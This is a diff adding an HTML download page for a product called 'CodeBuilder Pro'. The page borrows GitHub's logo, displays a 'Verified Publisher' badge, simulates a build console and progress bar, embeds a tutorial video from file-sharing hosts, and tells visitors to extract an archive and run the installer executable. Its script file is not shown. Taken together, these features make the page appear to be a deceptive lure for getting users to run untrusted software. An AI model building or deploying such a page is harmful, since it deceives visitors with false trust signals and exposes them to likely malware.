@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodeBuilder Pro</title>
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23c9d1d9'%3E%3Cpath d='M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z'/%3E%3C/svg%3E">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Header -->
+    <header class="top-nav">
+        <div class="top-nav-wrapper">
+            <div class="top-nav-left">
+                <svg height="24" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="24" class="brand-logo">
+                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
+                </svg>
+                <div class="title-wrapper">
+                    <span class="title-main">Download for Windows</span>
+                    <span class="title-secondary">CodeBuilder Pro</span>
+                </div>
+            </div>
+            <div class="publisher-badge">
+                <span>Verified Publisher</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="page-wrapper">
+        <div class="main-panel">
+            
+            <!-- File Download Section -->
+            <div class="download-panel">
+                <div class="panel-header">
+                    <h2>File Download</h2>
+                    <p>Your download is being processed automatically using redundant server infrastructure.</p>
+                </div>
+
+                <!-- Status Bar -->
+                <div class="status-panel">
+                    <div class="status-group">
+                        <div id="status-icon" class="status-indicator">⬇</div>
+                        <span id="status-text" class="status-label" data-testid="text-status">Initializing build environment...</span>
+                    </div>
+                    <button id="btn-retry" class="btn-retry is-hidden" data-testid="button-retry">Retry</button>
+                </div>
+
+                <!-- Progress Bar -->
+                <div id="progress-container" class="progress-wrapper is-hidden">
+                    <div class="progress-track">
+                        <div id="progress-bar" class="progress-bar" data-testid="progress-download"></div>
+                    </div>
+                    <p id="progress-text" class="progress-label">0% complete</p>
+                </div>
+
+                <!-- Terminal Output -->
+                <div id="terminal" class="console is-hidden">
+                    <div class="console-title">BUILD OUTPUT</div>
+                    <div id="terminal-content" class="console-body">
+                        <div id="cursor-line" class="prompt-line is-hidden">
+                            <span>&gt;</span>
+                            <span id="cursor" class="prompt-cursor">_</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Installation Guide Section -->
+            <div class="install-panel">
+                <div class="panel-header">
+                    <h2>Installation Guide</h2>
+                    <p>Follow these steps to complete the installation process.</p>
+                </div>
+
+                <!-- Video Block -->
+                <div class="video-container">
+                    <video autoplay loop muted playsinline style="width: 100%; height: 100%; border-radius: 6px; object-fit: cover; object-position: center;">
+                        <source src="https://files.catbox.moe/kgjyjb.mp4" type="video/mp4">
+                        <source src="https://i.imgur.com/Rq2ff0Y.mp4" type="video/mp4">
+                        Your browser does not support the video tag.
+                    </video>
+                </div>
+
+                <!-- Installation Steps -->
+                <div class="steps-panel">
+                    <h3>Installation Steps</h3>
+                    <div class="steps-container">
+                        <div class="step-row">
+                            <span class="step-badge">1</span>
+                            <span class="step-description">Wait for download to complete</span>
+                        </div>
+                        <div class="step-row">
+                            <span class="step-badge">2</span>
+                            <span class="step-description">Extract the archive file</span>
+                        </div>
+                        <div class="step-row">
+                            <span class="step-badge">3</span>
+                            <span class="step-description">Navigate to the extracted folder</span>
+                        </div>
+                        <div class="step-row">
+                            <span class="step-badge">4</span>
+                            <span class="step-description">Run the installer executable</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bottom-nav">
+        <div class="bottom-nav-wrapper">
+            <div class="bottom-nav-left">
+                <svg height="20" aria-hidden="true" viewBox="0 0 24 24" version="1.1" width="20" class="bottom-logo">
+                    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
+                </svg>
+                <span class="copyright-text">© 2025 CodeBuilder Systems</span>
+            </div>
+            <div class="bottom-nav-links">
+                <a href="#" class="bottom-nav-link">Terms</a>
+                <a href="#" class="bottom-nav-link">Privacy</a>
+                <a href="#" class="bottom-nav-link">Security</a>
+                <a href="#" class="bottom-nav-link">Status</a>
+                <a href="#" class="bottom-nav-link">Community</a>
+                <a href="#" class="bottom-nav-link">Docs</a>
+                <a href="#" class="bottom-nav-link">Contact</a>
+                <a href="#" class="bottom-nav-link">Manage cookies</a>
+                <a href="#" class="bottom-nav-link">Do not share my personal information</a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="scripts.js"></script>
+</body>
+</html>
